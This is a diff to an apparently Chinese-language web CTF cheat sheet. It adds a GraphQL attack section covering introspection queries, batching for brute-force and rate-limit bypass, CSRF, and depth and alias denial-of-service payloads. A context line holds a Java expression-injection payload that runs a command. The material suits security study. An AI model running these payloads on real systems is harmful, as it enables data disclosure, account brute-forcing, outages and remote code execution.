@@ -2417,7 +2417,7 @@ Content-Disposition: form-data; name="path";
 Double Boundary (前後端解析不一致):
 
 ```
-Content-Type: multipart/form-data; BOUNDARY=y:; boundary=x; 
+Content-Type: multipart/form-data; BOUNDARY=y; boundary=x; 
 
 --x
 Content-Disposition: form-data; name="test";
@@ -4665,7 +4665,62 @@ state[i] = state[i-3] + state[i-31]`
         - `${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}`
     - Example
         - [Seikai CTF 2023 - Frog WAF](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#frog-waf-29-solves)
-
+        - 繞 openrasp: https://landgrey.me/blog/15/
+- GraphQL
+    - 資訊洩漏
+        - 基本查詢
+            - 查詢存在的類型: 
+                - `{ __schema { types { name } } }`
+                - `{__schema{types{name,fields{name}}}}`
+            - 查詢一個類型所有字段: 
+                - `{ __type (name: "Query") { name fields { name type { name kind ofType { name kind } } } } }`
+                - `{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}`
+                    - 提取所有類型、他的字段、參數以及參數類型
+                - 可以觀察一些敏感字段，如: password, email, token, session, secretkey, ... 等
+            - 透過 Introspection 來撈 schema:
+                - `fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}`
+        - Suggestion
+            - 當輸入一個未知的keyword，Graphql backend 會建議正確的keyword
+                - `"message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",`
+            - 透過字典檔去brute-force
+                - https://github.com/Escape-Technologies/graphql-wordlist
+        - 錯誤訊息
+            - 可以透過錯誤訊息取得有用資訊
+            - `{__schema}`
+            - `{}`
+            - `{somerandomshit}`
+        - Graphene-Django DEBUG
+            - 透過添加 `__debug` 來取得詳細資訊，例如 sql 執行語句
+    - Batch query
+        - 可以透過 Array-based query 一次送好幾個請求
+        - Apollo GraphQL 預設不啟用 Array Batching
+        - 常見情境：Password brute-force, Rate limit bypass, DoS
+        - `[{ query: 'query { book(id: 1) { __typename } }' },{ query: 'query { book(id: 1) { __typename } }' }]`
+        - JSON list based batching 不能用時，可以嘗試 Query name based batching
+            - `{"query": "query { kaibro: Query { meow } kaibro1: Query { meow } }"}`
+        - Example:
+            - [Line CTF 2024 - graphql-101](https://adragos.ro/line-ctf-2024/#graphql-101)
+            - [corCTF 2023 - force](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#force-118-solves)
+    - CSRF
+        - GET-based
+            - `/graphql?query=query+%7B+a+%7D`
+        - POST-based
+            - content-type 改 `x-www-form-urlencoded` 仍可執行
+            - Example: Express-GraphQL, [Portswigger's lab](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
+    - Query Depth Attack
+        - 未阻擋的話，容易造成DoS
+        - Example: `query { books { title author { title books { title author { ... } } } } }`
+    - Alias overloading
+        - Example: `query { book(id: 1) { __typename alias: __typename alias2: __typename alias3: __typename alias4: __typename } }`
+    - Tool
+        - [graphw00f](https://github.com/dolevf/graphw00f) (fingerprinting)
+        - [graphquail](https://github.com/forcesunseen/graphquail)
+        - [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap)
+        - ...
+    - Example:
+        - [Line CTF 2023 - Momomomomemomemo](https://blog.huli.tw/2023/03/27/linectf-2023-writeup/#momomomomemomemo-3-solves)
+        - [VolgaCTF 2020 - library](https://github.com/w181496/CTF/tree/eedc3315e8c5719771f6ecc5efd11f9d61df314c/volgactf2020_quals/library)
+        - [HITCON 2018 - BabyQuery](https://4f-kira.github.io/2018/02/05/HITCTF2018-writeup/#BabyQuery)
 - HTTP2 Push
     - Server 自己 push 東西回來 (e.g. CSS/JS file)
     - e.g. [ALLES CTF 2020 - Push](https://github.com/0x13A0F/CTF_Writeups/tree/master/alles_ctf#push)
